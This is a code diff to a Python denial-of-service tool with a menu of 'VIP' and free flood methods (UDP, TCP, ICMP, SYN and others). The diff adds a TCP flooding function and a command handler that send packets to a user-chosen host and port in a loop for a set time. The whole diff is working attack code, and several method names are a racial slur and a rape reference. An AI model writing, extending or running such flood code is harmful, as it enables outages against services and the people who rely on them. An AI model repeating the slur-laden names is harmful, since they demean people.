@@ -19,15 +19,16 @@ def modifications():
 #column:65
 method = """\033[91m
 ╔════════════════════════════════════════════════════════╗
-║                     \033[00mDDoS METHODS\033[91m                       ║               
+║                      \033[00mDDOS   METHODS\033[91m                    ║               
 ║════════════════════════════════════════════════════════║
 ║═══════════════════════VIP═METHODS══════════════════════║
-║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP  ATTACK\033[91m  ║
-║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m ICMP ATTACK\033[91m  ║
-║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m STD  ATTACK\033[91m  ║
+║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP   ATTACK\033[91m ║
+║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m STD   ATTACK\033[91m ║
+║ \033[00mTCP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m TCP   ATTACK\033[91m ║
+║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m ICMP  ATTACK\033[91m ║
 ║ \033[00mRAPE <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
 ║ \033[00mCOON <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
-║ \033[00mslpr <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
+║ \033[00mSLPR <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
 ║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
@@ -172,6 +173,23 @@ def custom2(host, port, timer, payload):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    
+    said += 1
+    aid += 1
+    tattacks += 1
+    while time.time() < timeout and udp and attack:
+        sock.sendto(payload, (host, int(port)))
+    said -= 1
+    aid -= 1
+def custom3(host, port, timer, payload):
+    global uaid
+    global udp
+    global aid
+    global tattacks
+    global said
+ 
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
     
     said += 1
     aid += 1
@@ -419,7 +437,7 @@ def main():
                 try:
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("Attack sent to: {}".format (host))
+                    print ("UDP: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
                 except ValueError:
@@ -437,7 +455,7 @@ def main():
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
-                    print ("Attack sent to: {}".format (host))
+                    print ("RAPE: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=custom, args=(host, port, timer, punch)).start()
                 except ValueError:
@@ -458,6 +476,24 @@ def main():
                     print ("COON: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=custom, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
+        elif sinput == "tcp":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer, pack = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
+                    print ("TCP: Attack sent to: {}".format (host))
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=custom3, args=(host, port, timer, punch)).start()
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
